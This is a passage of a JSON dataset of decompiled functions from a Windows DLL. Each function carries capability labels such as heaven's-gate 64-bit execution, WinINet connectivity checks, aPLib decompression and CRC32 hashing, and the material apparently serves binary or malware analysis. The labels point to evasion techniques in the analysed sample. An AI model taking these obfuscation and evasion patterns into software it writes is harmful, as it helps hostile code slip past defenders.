*0x10040984 * 2 - 0x1a43;\n        uVar6 = uVar5;\n        *0x100409b0 = (*0x100409b0 - 0xef) + (uVar5 & 0xffff);\n    }\n    else {\n        *0x100409e8 = (*0x100409e8 - 0xef) + (uVar7 & 0xffff);\n        uVar6 = *0x10040984 * 2 + 0xe5bd;\n    }\n    if (*0x100409c8 + *0x10040a00 == 0x130) {\n        uVar6 = uVar6 * 2 + 0xe5bd;\n        *0x100409b0 = (uVar6 - 0xef) + *0x100409b0;\n    }\n    else {\n        *0x100409e8 = (uVar6 - 0xef) + *0x100409e8;\n        uVar6 = uVar6 * 2 + 0xe5bd;\n    }\n    *0x10040984 = *0x10040984 & 0xffff0000 | uVar6;\n    fcn.100216e0();\n    if (*0x10040994 + (*0x100409b0 & 0xffff) == 0x130) {\n        iVar3 = *0x100409b4 * 2 + 0xe5bd;\n        *0x10040984 = *0x10040984 + (iVar3 - *0x100409b0) + 5;\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + (*0x100409b4 - *0x100409b0) + 5;\n        iVar3 = *0x100409b4 * 2 + 0xe5bd;\n    }\n    *0x100409b4 = (*0x100409b0 - iVar3) + *0x10040980;\n    *0x10040984 = *0x10040984 & 0xffff0000 | *0x10040984 + (0x2b - *0x100409b4);\n    return 1;\n}\n",
        "token_count": 1574
    },
    "10022b00": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.10022b00(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t *piVar8;\n    char *pcVar9;\n    int32_t extraout_ECX;\n    int32_t *extraout_ECX_00;\n    uint8_t uVar10;\n    int32_t *unaff_EBX;\n    int32_t *piVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uchar *puVar14;\n    uint *puVar15;\n    uchar *puVar16;\n    uint *puVar17;\n    uint *puVar18;\n    uchar *puVar19;\n    uint *puVar20;\n    int32_t **ppiVar21;\n    ushort in_DS;\n    bool bVar22;\n    uint64_t uVar23;\n    int32_t *var_69h;\n    uint32_t var_59h;\n    uchar *var_49h;\n    uint var_39h;\n    uint var_11h;\n    uchar uStack9;\n    uchar uStack8;\n    ushort uStack7;\n    uchar uStack5;\n    \n    piVar8 = &stack0xfffffffc;\n    piVar11 = &stack0xfffffffc;\n    uStack5 = unaff_EBX >> 0x18;\n    piVar5 = unaff_EBX;\n    if (param_1 != 0) {\n        uStack9 = 0x2e;\n        uStack8 = 0x2b;\n        uStack7 = 0x1002;\n        iVar4 = (**0x2e1f78)();\n        piVar5 = iVar4 + -1;\n        var_69h = piVar5;\n        if (unaff_EBX[4] == 0) {\ncode_r0x10022b4d:\n            uStack8 = 0x5d;\n            uStack7 = 0x22b;\n            uStack5 = 0x10;\n            (**0x2e1f21)();\n        }\n        else if (unaff_EBX[4] != -1) {\n            LOCK();\n            piVar1 = unaff_EBX + 4;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) goto code_r0x10022b4d;\n        }\n    }\n    uStack8 = 0x70;\n    uStack7 = 0x22b;\n    uStack5 = 0x10;\n    uVar6 = (**0x2e262e)();\n    var_59h = uVar6;\n    if (piVar5[8] == 0) {\n        ppiVar21 = &fcn.10022b00::var_69h;\n    }\n    else {\n        ppiVar21 = piVar5[2] + (uVar6 % piVar5[8]) * 8;\n        piVar1 = *ppiVar21;\n        while (piVar1 != piVar5) {\n            if (uVar6 == piVar1[2]) {\n                uStack8 = 0xa8;\n                uStack7 = 0x22b;\n                uStack5 = 0x10;\n                cVar3 = (**0x2e218e)();\n                if (cVar3 != '\\0') break;\n            }\n            ppiVar21 = *ppiVar21;\n            piVar1 = *ppiVar21;\n        }\n    }\n    if (*ppiVar21 + -1 == piVar5) {\n        uStack8 = 0xd2;\n        uStack7 = 0x22b;\n        uStack5 = 0x10;\n        cVar3 = (**0x2e25dc)();\n        if (cVar3 != '\\0') {\n            uStack8 = 0xe2;\n            uStack7 = 0x22b;\n            uStack5 = 0x10;\n            uVar6 = (**0x2e25bc)();\n            var_59h = uVar6;\n            if (piVar5[8] == 0) {\n                ppiVar21 = &fcn.10022b00::var_69h;\n            }\n            else {\n                ppiVar21 = piVar5[2] + -1 + (uVar6 % piVar5[8]) * 8;\n                piVar1 = *ppiVar21;\n                while (piVar1 + -1 != piVar5) {\n                    if (uVar6 == (piVar1 + -1)[2]) {\n                        uStack8 = 0x18;\n                        uStack7 = 0x22c;\n                        uStack5 = 0x10;\n                        cVar3 = (**0x2e211e)();\n                        if (cVar3 != '\\0') break;\n                    }\n                    ppiVar21 = *ppiVar21;\n                    piVar1 = *ppiVar21;\n                }\n            }\n        }\n        uStack8 = 0x3b;\n        uStack7 = 0x22c;\n        uStack5 = 0x10;\n        iVar4 = (**0x2e256b)();\n        if (iVar4 != 2) {\n            *(iVar4 + -4) = *ppiVar21;\n            *(iVar4 + 4) = uVar6;\n            uStack8 = 0x59;\n            uStack7 = 0x22c;\n            uStack5 = 0x10;\n            (**0x2e1cbd)();\n            *(iVar4 + 0x17) = 6;\n            piVar8 = iVar4 + -1;\n        }\n        *ppiVar21 = piVar8;\n        var_69h[5] = var_69h[5] + 1;\n        piVar5 = var_69h;\n    }\n    else {\n        *(*ppiVar21 + 0x17) = 6;\n    }\n    uStack8 = 0x82;\n    uStack7 = 0x22c;\n    uStack5 = 0x10;\n    (**0x2e1c8c)();\n    uStack9 = 0xa6;\n    uStack8 = 0x2c;\n    uStack7 = 0x1002;\n    puVar7 = (**0x2e24e0)();\n    piVar8 = piVar5;\n    piVar1 = var_69h;\n    if ((piVar5[4] == 1) || (piVar5[4] == 0)) goto code_r0x10022d10;\n    *(puVar7 + 0x20) = 8;\n    pcVar2 = *0x2e1dcc;\n    puVar12 = puVar7 + -5;\n    puVar7 = puVar7 + -5;\n    *puVar12 = 0x10022cda;\n    iVar4 = (*pcVar2)();\n    piVar8 = iVar4 + -1;\n    piVar1 = piVar8;\n    if (piVar5[4] != 0) {\n        if (piVar5[4] == -1) goto code_r0x10022d10;\n        LOCK();\n        piVar5 = piVar5 + 4;\n        *piVar5 = *piVar5 + -1;\n        if (*piVar5 != 0) goto code_r0x10022d10;\n    }\n    pcVar2 = *0x2e1d75;\n    puVar13 = puVar7 + -4;\n    puVar7 = puVar7 + -4;\n    *puVar13 = 0x10022d09;\n    (*pcVar2)();\ncode_r0x10022d10:\n    var_69h = piVar1;\n    pcVar2 = *0x2e2482;\n    puVar14 = puVar7 + -4;\n    *(puVar7 + -4) = 0x10022d1c;\n    puVar7 = (*pcVar2)();\n    var_49h = puVar7;\n    if (piVar8[8] == 0) {\n        ppiVar21 = &fcn.10022b00::var_69h;\n    }\n    else {\n        ppiVar21 = piVar8[2] + (puVar7 % piVar8[8]) * 8;\n        piVar5 = *ppiVar21;\n        pcVar2 = *0x2e1fe8;\n        while (*0x2e1fe8 = pcVar2,  piVar5 != piVar8) {\n            if (puVar7 == piVar5[2]) {\n                puVar15 = puVar14 + -4;\n                puVar14 = puVar14 + -4;\n                *puVar15 = 0x10022d4e;\n                cVar3 = (*pcVar2)();\n                if (cVar3 != '\\0') break;\n            }\n            ppiVar21 = *ppiVar21;\n            pcVar2 = *0x2e1fe8;\n            piVar5 = *ppiVar21;\n        }\n    }\n    pcVar2 = *0x2e2436;\n    if (*ppiVar21 + -1 != piVar8) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar16 = puVar14 + -4;\n    *(puVar14 + -4) = 0x10022d78;\n    cVar3 = (*pcVar2)();\n    pcVar2 = *0x2e2416;\n    if (cVar3 != '\\0') {\n        puVar17 = puVar16 + -4;\n        puVar16 = puVar16 + -4;\n        *puVar17 = 0x10022d88;\n        puVar7 = (*pcVar2)();\n        var_49h = puVar7;\n        if (piVar8[8] == 0) {\n            ppiVar21 = &fcn.10022b00::var_69h;\n        }\n        else {\n            ppiVar21 = piVar8[2] + -1 + (puVar7 % piVar8[8]) * 8;\n            piVar5 = *ppiVar21;\n            pcVar2 = *0x2e1f7c;\n            while (*0x2e1f7c = pcVar2,  piVar5 + -1 != piVar8) {\n                if (puVar7 == (piVar5 + -1)[2]) {\n                    puVar18 = puVar16 + -4;\n                    puVar16 = puVar16 + -4;\n                    *puVar18 = 0x10022dba;\n                    cVar3 = (*pcVar2)();\n                    if (cVar3 != '\\0') break;\n                }\n                ppiVar21 = *ppiVar21;\n                pcVar2 = *0x2e1f7c;\n                piVar5 = *ppiVar21;\n            }\n        }\n    }\n    pcVar2 = *0x2e23c9;\n    puVar19 = puVar16 + -4;\n    *(puVar16 + -4) = 0x10022ddd;\n    uVar23 = (*pcVar2)();\n    iVar4 = uVar23;\n    uVar23 = uVar23 & 0xffffffff00000000 | iVar4 - 2U;\n    if (iVar4 - 2U == 0) {\n        piVar5 = extraout_ECX + -1;\n    }\n    else {\n        *(iVar4 + -4) = *ppiVar21;\n        *(iVar4 + 4) = puVar7;\n        pcVar2 = *0x2e1b1b;\n        puVar20 = puVar19 + -4;\n        puVar19 = puVar19 + -4;\n        *puVar20 = 0x10022dfb;\n        uVar23 = (*pcVar2)();\n        *(iVar4 + 0x17) = 7;\n        piVar5 = extraout_ECX_00;\n        piVar11 = iVar4 + -1;\n    }\n    *ppiVar21 = piVar11;\n    piVar11 = var_69h;\n    pcVar9 = uVar23 + -2;\n    var_69h[5] = var_69h[5] + 1;\n    *ppiVar21 = *puVar7;\n    uVar10 = uVar23 >> 0x28;\n    uVar6 = uVar23 >> 0x20 & 0xffff0000 | CONCAT11(uVar10 << 2 | uVar10 >> 6, uVar23 >> 0x20);\n    uVar10 = *(uVar6 + 0x1e000973 + pcVar9 * 8);\n    *(puVar19 + -4) = in_DS;\n    *pcVar9 = *pcVar9 + pcVar9;\n    *pcVar9 = *pcVar9 + pcVar9;\n    pcVar9 = uVar6 - 0x36;\n    *pcVar9 = *pcVar9 + piVar11;\n    *piVar5 = *piVar5 + -0x2a;\n    pcVar9 = uVar23 + 0xca19;\n    *pcVar9 = *pcVar9 + pcVar9;\n    *piVar5 = *piVar5 + (pcVar9 >> 8);\n    bVar22 = (ppiVar21 + 1 & (piVar11 & 0xffff0000 | CONCAT11(piVar11 >> 8 ^ uVar10, piVar11))) < 0;\n    pcVar2 = swi(0xdc);\n    (*pcVar2)();\n    if (bVar22) {\n        return;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 3086
    },
    "100014e0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint16_t * __thiscall fcn.100014e0(code **param_1, uint16_t *param_2, uint16_t *param_3)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*param_1 != vtable.std::ctype_wchar_t_.0) {\n    // WARNING: Could not recover jumptable at 0x10001531. Too many branches\n    // WARNING: Treating indirect jump as call\n        puVar2 = (**(*param_1 + 0x1c))();\n        return puVar2;\n    }\n    uVar3 = param_3 + (1 - param_2) >> 1;\n    uVar4 = 0;\n    if (param_3 < param_2) {\n        uVar3 = 0;\n    }\n    if (uVar3 != 0) {\n        do {\n            uVar1 = fcn.1000a294(*param_2, param_1 + 2);\n            *param_2 = uVar1;\n            uVar4 = uVar4 + 1;\n            param_2 = param_2 + 1;\n        } while (uVar4 != uVar3);\n    }\n    return param_2;\n}\n",
        "token_count": 293
    },
    "10002a90": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10002a90(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_8h;\n    int32_t var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x1002a850;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    uVar6 = var_8h | 7;\n    if (uVar6 < 0x7fffffff) {\n        uVar4 = param_1[5];\n        uVar3 = uVar4 >> 1;\n        var_8h = uVar6;\n        if ((uVar6 / 3 < uVar3) && (var_8h = uVar3 + uVar4,  0x7ffffffe - uVar3 < uVar4)) {\n            var_8h = 0x7ffffffe;\n        }\n    }\n    uVar6 = var_8h + 1;\n    var_4h = 0;\n    if (uVar6 == 0) {\n        puVar5 = NULL;\n    }\n    else {\n        if (0x7fffffff < uVar6) {\n            uVar6 = fcn.1000b73a();\n        }\n        uVar6 = uVar6 * 2;\n        if (uVar6 < 0x1000) {\n            puVar5 = fcn.1000ac95(uVar6);\n        }\n        else {\n            uVar4 = uVar6 + 0x23;\n            if (uVar4 <= uVar6) {\n                fcn.1000b73a();\n                uVar4 = extraout_ECX;\n            }\n            iVar1 = fcn.1000ac95(uVar4);\n            puVar5 = iVar1 + 0x23U & 0xffffffe0;\n            puVar5[-1] = iVar1;\n        }\n    }\n    if (var_ch_2 != 0) {\n        puVar2 = param_1;\n        if (7 < param_1[5]) {\n            puVar2 = *param_1;\n        }\n        if (var_ch_2 != 0) {\n            fcn.1000d4c0(puVar5, puVar2, var_ch_2 * 2);\n        }\n    }\n    if (7 < param_1[5]) {\n        fcn.100026c0(*param_1, param_1[5] + 1);\n    }\n    param_1[5] = 7;\n    param_1[4] = 0;\n    puVar2 = param_1;\n    if (7 < param_1[5]) {\n        puVar2 = *param_1;\n    }\n    *puVar2 = 0;\n    *param_1 = puVar5;\n    param_1[5] = var_8h;\n    param_1[4] = var_ch_2;\n    if (7 < param_1[5]) {\n        param_1 = puVar5;\n    }\n    *(param_1 + var_ch_2 * 2) = 0;\n    *in_FS_OFFSET = var_ch_3;\n    return;\n}\n",
        "token_count": 815
    },
    "10002cf0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10002cf0(uint32_t **param_1, uint32_t *param_2, uint32_t *param_3)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t *extraout_ECX;\n    uint32_t *extraout_ECX_00;\n    uint32_t *extraout_ECX_01;\n    uint32_t uVar2;\n    uint32_t extraout_ECX_02;\n    uint32_t **ppuVar4;\n    uint32_t *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint32_t *var_8h;\n    uint32_t *var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    uint32_t *puVar3;\n    \n    uStack12 = 0x1002a870;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    puVar5 = var_8h | 0xf;\n    if (puVar5 != 0xffffffff) {\n        puVar3 = param_1[5];\n        uVar2 = puVar3 >> 1;\n        var_8h = puVar5;\n        if ((puVar5 / 3 < uVar2) && (var_8h = uVar2 + puVar3,  -2 - uVar2 < puVar3)) {\n            var_8h = 0xfffffffe;\n        }\n    }\n    puVar5 = var_8h + 1;\n    var_4h = 0;\n    if (puVar5 == NULL) {\n        ppuVar4 = NULL;\n    }\n    else if (puVar5 < 0x1000) {\n        ppuVar4 = fcn.1000ac95(puVar5);\n    }\n    else {\n        puVar3 = var_8h + 9;\n        if (puVar3 <= puVar5) {\n            fcn.1000b73a();\n            puVar3 = extraout_ECX;\n        }\n        puVar5 = fcn.1000ac95(puVar3);\n        ppuVar4 = puVar5 + 0x23U & 0xffffffe0;\n        ppuVar4[-1] = puVar5;\n    }\n    if (var_ch_2 != NULL) {\n        ppuVar1 = param_1;\n        if (0xf < param_1[5]) {\n            ppuVar1 = *param_1;\n        }\n        if (var_ch_2 != NULL) {\n            fcn.1000d4c0(ppuVar4, ppuVar1, var_ch_2);\n        }\n    }\n    if (0xf < param_1[5]) {\n        puVar5 = *param_1;\n        if (0xfff < param_1[5] + 1U) {\n            puVar3 = puVar5;\n            if ((puVar5 & 0x1f) != 0) {\n                fcn.10010ddf();\n                puVar3 = extraout_ECX_00;\n            }\n            puVar5 = puVar3[-1];\n            if (puVar3 <= puVar5) {\n                puVar5 = fcn.10010ddf();\n                puVar3 = extraout_ECX_01;\n            }\n            uVar2 = puVar3 - puVar5;\n            if (uVar2 < 4) {\n                puVar5 = fcn.10010ddf();\n                uVar2 = extraout_ECX_02;\n            }\n            if (0x23 < uVar2) {\n                puVar5 = fcn.10010ddf();\n            }\n        }\n        fcn.1000acc8(puVar5);\n    }\n    param_1[5] = 0xf;\n    param_1[4] = NULL;\n    ppuVar1 = param_1;\n    if (0xf < param_1[5]) {\n        ppuVar1 = *param_1;\n    }\n    *ppuVar1 = 0;\n    *param_1 = ppuVar4;\n    param_1[5] = var_8h;\n    param_1[4] = var_ch_2;\n    if (0xf < param_1[5]) {\n        param_1 = ppuVar4;\n    }\n    *(param_1 + var_ch_2) = 0;\n    *in_FS_OFFSET = var_ch_3;\n    return;\n}\n",
        "token_count": 1011
    },
    "10003920": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10003920(int32_t *param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if (param_1[2] - param_1[1] >> 3 < param_2) {\n        iVar3 = param_1[1] - *param_1 >> 3;\n        if (0x1fffffffU - iVar3 < param_2) {\n            fcn.1000a1f1(\"vector<T> too long\");\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        param_2 = iVar3 + param_2;\n        uVar4 = param_1[2] - *param_1 >> 3;\n        uVar2 = 0;\n        if (uVar4 <= 0x1fffffff - (uVar4 >> 1)) {\n            uVar2 = (uVar4 >> 1) + uVar4;\n        }\n        if (param_2 <= uVar2) {\n            param_2 = uVar2;\n        }\n        fcn.10003980(param_2);\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "100045b0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.100045b0(int32_t *param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if (param_1[2] - param_1[1] >> 3 < param_2) {\n        iVar3 = param_1[1] - *param_1 >> 3;\n        if (0x1fffffffU - iVar3 < param_2) {\n            fcn.1000a1f1(\"vector<T> too long\");\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        param_2 = iVar3 + param_2;\n        uVar4 = param_1[2] - *param_1 >> 3;\n        uVar2 = 0;\n        if (uVar4 <= 0x1fffffff - (uVar4 >> 1)) {\n            uVar2 = (uVar4 >> 1) + uVar4;\n        }\n        if (param_2 <= uVar2) {\n            param_2 = uVar2;\n        }\n        fcn.10004ac0(param_2);\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "10004bb0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10004bb0(int32_t *param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if ((param_1[2] - param_1[1]) / 0xc < param_2) {\n        iVar2 = (param_1[1] - *param_1) / 0xc;\n        if (0x15555555U - iVar2 < param_2) {\n            fcn.1000a1f1(\"vector<T> too long\");\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        param_2 = param_2 + iVar2;\n        uVar3 = (param_1[2] - *param_1) / 0xc;\n        uVar4 = 0;\n        if (uVar3 <= 0x15555555 - (uVar3 >> 1)) {\n            uVar4 = (uVar3 >> 1) + uVar3;\n        }\n        if (param_2 <= uVar4) {\n            param_2 = uVar4;\n        }\n        fcn.10004d90(param_2);\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "10004f00": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10004f00(int32_t *param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    if (param_1[2] - param_1[1] >> 2 < param_2) {\n        iVar3 = param_1[1] - *param_1 >> 2;\n        if (0x3fffffffU - iVar3 < param_2) {\n            fcn.1000a1f1(\"vector<T> too long\");\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        param_2 = iVar3 + param_2;\n        uVar4 = param_1[2] - *param_1 >> 2;\n        uVar2 = 0;\n        if (uVar4 <= 0x3fffffff - (uVar4 >> 1)) {\n            uVar2 = (uVar4 >> 1) + uVar4;\n        }\n        if (param_2 <= uVar2) {\n            param_2 = uVar2;\n        }\n        fcn.10004f60(param_2);\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "10001ab0": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nuint8_t fcn.10001ab0(void)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *piStack16;\n    int32_t iStack12;\n    \n    uVar3 = *0x10040984 + *0x100409b0 + -0x1a43;\n    uVar6 = *0x10040984 & 0xffff0000;\n    if (*0x100409b4 <= uVar3) {\n        uVar3 = *0x10040988 * -4 + 0xa262;\n        *0x100409a4 = *0x10040988;\n    }\n    *0x10040984 = uVar6 | uVar3;\n    uVar5 = *0x100409b0 & 0xffff;\n    uVar4 = *0x10040994;\n    *0x10040986 = uVar6 >> 0x10;\n    iVar1 = *0x100409b4 - *0x10040986;\n    piStack16 = *0x1004262c;\n    iStack12 = 0x42;\n    uVar6 = *0x100409b0;\n    do {\n        if (*0x100409ae == 0xb61) {\n            *0x10040988 = (*0x1004099c + *0x10040988) * 2 + -0x1a43;\n        }\n        if (uVar4 + uVar5 == 0x130) {\n            *0x10040984 = *0x10040984 & 0xffff0000 | *0x10040988 * 2 + 0xe5c2;\n        }\n        else {\n            *0x100409a4 = *0x100409a4 + (*0x10040988 - *0x10040984) + 5;\n        }\n        *0x10040988 = *0x10040988 * 2 + -0x1a43;\n        uVar6 = uVar6 + iVar1 + 5;\n        uVar2 = *0x10040986 + 1 + *0x10040984;\n        if (*0x100409ae == 0xb61) {\n            uVar6 = (*0x1004099c + uVar6) * 2 + 0xe5bd;\n        }\n        *0x10042624 = *piStack16 + 0x10a2fb4;\n        *0x100409b0 = uVar6;\n        *piStack16 = *0x10042624;\n        piStack16 = piStack16 + 1;\n        *0x100409b4 = uVar2 + 0x3e + *0x100409b4;\n        iStack12 = iStack12 + -1;\n        *0x10040984 = *0x10040984 & 0xffff0000 | *0x100409b4;\n    } while (iStack12 != 0);\n    *0x10040988 = uVar6 + *0x100409b4 * -0x55;\n    if (*0x100409ae == 0xb61) {\n        *0x10040988 = (*0x1004099c + *0x10040988) * 2 + 0xe5bd;\n    }\n    return uVar2;\n}\n",
        "token_count": 772
    },
    "100214d0": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.100214d0(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char cVar3;\n    uint16_t *puVar4;\n    char cVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint8_t uStack13;\n    int32_t iStack12;\n    char cStack4;\n    \n    cStack4 = -0x40;\n    if (*0x100409ae == 0xb61) {\n        *0x100409b4 = (*0x1004099c + *0x100409b4) * 2 + 0xe5bd;\n    }\n    if (*0x10040994 + *0x100409b0 == 0x130) {\n        *0x100409b4 = *0x10040980 * 2 + 0xe5c2;\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + (*0x10040980 - *0x100409b4) + 5;\n    }\n    iVar7 = *0x100409b4 + (-0x1e95 - uStack13);\n    if (*0x100409a0 == 9) {\n        iStack12 = 0x1ebb - iVar7;\n    }\n    else {\n        cStack4 = param_1 + '}';\n        iStack12 = param_1;\n    }\n    cVar5 = iVar7;\n    *0x10040980 = (uStack13 - (*0x10040980 * 2 + 0xe5bd)) + *0x100409b4 + 0x3e + iStack12;\n    cVar6 = *0x10040980;\n    *0x10040980 = iStack12 + 1 + *0x10040980;\n    cVar3 = iStack12;\n    uVar1 = cVar5 + '\\x01' + cVar3;\n    cVar2 = uVar1 + 0x3e + cVar3;\n    uVar8 = iStack12 + 0x3e + *0x10040980;\n    puVar4 = 0x10040990;\n    while (uVar1 != *0x100409a4) {\n        uVar8 = uVar8 + *puVar4;\n        uVar1 = cVar3 + '>' + uVar8;\n        if ((uVar8 == *0x1004099a) || (puVar4 = puVar4 + 2,  0x100409c9 < puVar4)) break;\n    }\n    *0x10040986 = uVar1 + (('+' - cVar2) - uVar8);\n    *0x100409b4 = (((((((((uStack13 * '\\x02' - cVar5) + cStack4) - cVar6) + cVar5) * '\\x02' - cVar6) +\n                     (-*0x10040980 - cVar3)) - cVar2) + 0xd) - *0x10040980) + -5;\n    return;\n}\n",
        "token_count": 703
    },
    "10021670": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10021670(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    uVar3 = param_1 * -2 + 0x1f31U & 0xffff;\n    iVar5 = *0x10040988 + 0xe5b8 + (uVar3 - param_1);\n    iVar2 = iVar5 - *0x10040988;\n    iVar1 = *0x10040988 * 2;\n    iVar6 = *0x10040988 + 1 + param_1;\n    iVar4 = (iVar6 - *0x10040988) + param_1;\n    *0x10040988 = (iVar6 - iVar4) + param_1;\n    *0x100409b4 = iVar1 + (param_1 - (iVar2 + uVar3 + 5 & 0xffff)) + iVar5 + 0x87dc + iVar4;\n    return;\n}\n",
        "token_count": 248
    },
    "10022760": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nint16_t __fastcall fcn.10022760(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int16_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint8_t uStack17;\n    \n    uVar5 = 0x1e1d;\n    iVar10 = 0;\n    if (*0x100409ae == 0xb61) {\n        *0x100409b4 = (*0x1004099c + *0x100409b4) * 2 + 0xe5bd;\n    }\n    piVar8 = 0x100409ec;\n    uStack17 = *0x10040986;\n    do {\n        iVar3 = param_1;\n        if (*0x10040986 == *0x100409a4) break;\n        *piVar8 = *piVar8 - iVar3;\n        uVar6 = param_1 + *0x10040986 * -0x55;\n        uVar1 = param_1 + -0x2b + *0x10040986;\n        uVar5 = uVar6 - uVar1;\n        iVar10 = -(uVar6 < uVar1);\n        piVar8 = piVar8 + -1;\n    } while (0x10040992 < piVar8);\n    piVar8 = 0x100409ec;\n    uVar1 = (*0x10040984 * 2 - *0x100409b4) - 0x5df3;\n    *0x10040984 = *0x10040984 & 0xffff0000 | uVar1 & 0xffff;\n    do {\n        if (*0x100409b4 == *0x100409a4) break;\n        *piVar8 = *piVar8 - iVar3;\n        uVar7 = param_1 + *0x100409b4 * -0x55;\n        uVar6 = (*0x100409b4 - 0x2b) + param_1;\n        uVar5 = uVar7 - uVar6;\n        iVar10 = -(uVar7 < uVar6);\n        piVar8 = piVar8 + -1;\n    } while (0x10040992 < piVar8);\n    iVar2 = *0x100409b4 + 0xe5bd + uVar5;\n    iVar9 = (*0x10040986 - iVar2) + -0x5dc7;\n    if (*0x10040994 + (*0x100409b0 & 0xffff) == 0x130) {\n        iVar9 = iVar9 + ((iVar2 * 2 + 0xe5c2) - *0x100409b0);\n    }\n    else {\n        *0x100409a4 = *0x100409a4 + (iVar2 - *0x100409b0) + 5;\n    }\n    if (*0x100409ae == 0xb61) {\n        uStack17 = (*0x1004099c + *0x10040986) * '\\x02' + 0xbd;\n    }\n    *0x100409b4 = (uVar1 & 0xffff) + 0x3e + iVar9;\n    if ((iVar10 != 0) || (uStack17 <= uVar5)) {\n        uVar5 = param_1 + uStack17 * -0x55;\n        *0x1004099a = *0x1004099a + iVar3;\n    }\n    cVar4 = uVar5;\n    if (*0x100409ae == 0xb61) {\n        *0x100409b4 = (*0x1004099c + 